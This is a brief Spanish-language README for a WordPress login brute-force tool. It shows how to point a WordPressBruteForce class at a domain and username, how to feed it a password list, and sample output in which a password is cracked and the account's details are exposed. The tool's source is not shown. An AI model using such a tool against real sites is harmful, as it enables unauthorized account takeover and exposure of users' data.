# WP-Login-Brute-Force


# Se Crea una Instancia WordPressBruteForce
Se incluye el dominio a realizar la prueba y el nombre de usuario
sitio_objetivo = WordPressBruteForce(wp_domain='example.com', wp_username='username')

"El nombre de usuario debe ser identificado con anterioridad,
el nombre de dominio debe incluir http:// o https://"

# Realiza un ataque de fuerza bruta
sitio_objetivo.brute_force_attack('password.txt')

"El archivo password debe contener una lista de potenciales contraseñas,
no debe llevar comas, y puede ser tan grande como se desee"

RESULTADO EJEMPLO:

Contraseña para "usuario1" Incorrecta.<br>
Autenticación -> "usuario2" | Password: "123456"<br>
Nombre de usuario: usuario2<br>
Nombre: Usuario<br>
Apellido: 2<br>
Correo electrónico: admin@example.com<br>
ID de usuario: 1<br>


Perfil: https://www.linkedin.com/in/wikitech/<br>
Blog: https://www.exploit505.blogspot.com
